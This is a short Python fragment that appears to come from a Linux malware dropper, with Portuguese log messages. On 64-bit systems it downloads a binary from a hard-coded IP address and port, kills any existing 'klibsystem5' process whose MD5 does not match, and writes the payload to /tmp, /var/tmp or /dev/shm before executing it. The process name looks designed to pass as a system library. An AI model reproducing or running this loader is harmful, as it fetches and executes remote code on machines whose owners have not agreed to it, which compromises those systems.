if platform.architecture ()[0] == "64bit":
  url = "http://185.172.128.146:443/bin"
  kill_process_if_md5_mismatch ("klibsystem5", "dc6e530a")
  if is_process_running ("klibsystem5"):
    print("Already running")
  else:
    for target_dir in ["/tmp", "/var/tmp", "/dev/shm"]:
        print("Tentando o diretorio: {}".format(target_dir))
        target_path = os.path.join(target_dir, "klibsystem5")
        if download_and_execute(url, target_path):
            print("Download Already OK")
            break
